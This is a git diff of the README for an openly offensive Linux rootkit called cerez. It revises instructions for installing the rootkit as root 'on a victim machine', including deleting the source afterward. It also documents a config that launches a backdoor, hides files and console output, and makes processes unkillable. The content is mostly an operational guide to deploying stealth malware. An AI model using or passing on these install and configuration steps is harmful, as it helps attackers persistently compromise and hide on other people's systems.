@@ -19,22 +19,26 @@ and others.
 - ✔ Makes processes unkillable 
 
 ## Install 
-To install the rootkit on a victim machine:
+### You will need to install `build-essential` to compile!
+You can install it with `apt` on debian systems:
+```bash
+apt update && apt install build-essential
 ```
-git clone https://github.com/ngn13/cerez.git
-cd cerez
-make 
-make install
-cd ..
-rm -rf cerez
+To install the rootkit on a victim machine run the following
+as **ROOT**:
+```bash
+git clone https://github.com/ngn13/cerez.git && cd cerez
+make && make install
+cd .. && rm -rf cerez
 ```
+Don't forget to edit `cerez.cfg` before install!
 
 ## Config `(/etc/cerez.cfg)`
 ```
-backdoor:/usr/bin/backdoor -> backdoor that will be started by the rootkit
-whitelist:/usr/bin/backdoor --> rootkit won't hide/protect stuff from this 
-output:1 --> if set to 1, cerez will hide any console output that contains hidden file names
-/etc/cerez.cfg -> rest is just the list of the files that will be hidden
+backdoor:/usr/bin/backdoor     --> backdoor that will be started by the rootkit
+whitelist:/usr/bin/backdoor    --> rootkit won't hide/protect stuff from this 
+output:1                       --> if set to 1, cerez will hide any console output that contains hidden file names
+/etc/cerez.cfg                 --> rest is just the list of the files that will be hidden
 ./cerez.cfg
 ...
 ```
